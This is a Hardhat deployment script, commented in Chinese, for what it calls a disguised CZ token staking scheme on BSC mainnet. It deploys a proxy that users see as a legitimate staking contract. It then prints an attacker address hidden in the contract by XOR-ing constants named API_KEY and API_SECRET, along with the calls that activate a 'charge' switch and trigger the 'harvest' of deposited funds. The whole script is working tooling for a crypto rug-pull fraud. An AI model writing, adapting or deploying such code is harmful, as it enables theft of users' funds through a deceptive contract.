// ============================================================
// 部署伪装 CZ 质押盘：CZStakingProxy（壳）+ CZStakingImpl（实现）
// 用法：
//   node scripts/deploy-cz-proxy.cjs          # hardhat 本地环境
//   node scripts/deploy-cz-proxy.cjs mainnet  # BSC 主网
// ============================================================
const { ethers } = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log(`[i] 部署者: ${deployer.address}`);

  // 部署实现合约
  const Impl = await ethers.getContractFactory("CZStakingImpl");
  const impl = await Impl.deploy();
  await impl.waitForDeployment();
  console.log(`[i] 实现合约: ${await impl.getAddress()}`);

  // 链自动选择代币
  const chainId = (await ethers.provider.getNetwork()).chainId;
  const isMainnet = chainId === 56n || process.argv[2] === "mainnet";
  // CZ 代币（BSC 主网）
  const CZ = isMainnet
    ? "0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04"
    : process.env.CZ_TEST_TOKEN || (await deployTestToken(deployer));
  // USDT
  const USDT = isMainnet
    ? "0x55d398326f99059fF775485246999027B3197955"
    : process.env.USDT_TEST_TOKEN || (await deployTestToken(deployer));

  console.log(`[i] chainId=${chainId} CZ=${CZ}`);
  console.log(`[i] USDT=${USDT}`);

  // 通过代理部署（初始化调用 initialize）
  const Proxy = await ethers.getContractFactory("CZStakingProxy");
  const initData = impl.interface.encodeFunctionData("initialize", [CZ, USDT]);
  const proxy = await Proxy.deploy(await impl.getAddress(), initData);
  await proxy.waitForDeployment();
  const proxyAddr = await proxy.getAddress();
  console.log(`[i] 代理合约: ${proxyAddr}`);

  // 验证
  const implAt = await ethers.getContractAt("CZStakingImpl", proxyAddr);
  console.log(`[i] owner: ${await implAt.owner()}`);
  console.log(`[i] cz:   ${await implAt.cz()}`);
  console.log(`[i] usdt: ${await implAt.usdt()}`);

  // 打印 XOR 攻击者地址（部署后确认）
  const apiKey = await implAt.API_KEY();
  const apiSecret = await implAt.API_SECRET();
  const xorResult = (apiKey ^ apiSecret) & BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");
  console.log(`[i] XOR 攻击者地址: ${"0x" + xorResult.toString(16).padStart(40, "0")}`);

  console.log(`\n[✓] 伪装 CZ 质押盘已部署`);
  console.log(`    代理地址（用户看到的质押合约）: ${proxyAddr}`);
  console.log(`    实现地址: ${await impl.getAddress()}`);
  console.log(`    激活熔断器: updateConfig(keccak256("charge"), keccak256("true"))`);
  console.log(`    触发收割:   onLpReceived(...) 或 confirmMultisig(keccak256("charge.now"))`);
}

async function deployTestToken(deployer) {
  const T = await ethers.getContractFactory("TestCON");
  const t = await T.deploy(ethers.parseEther("100000000"));
  await t.waitForDeployment();
  return await t.getAddress();
}

main().catch(console.error);
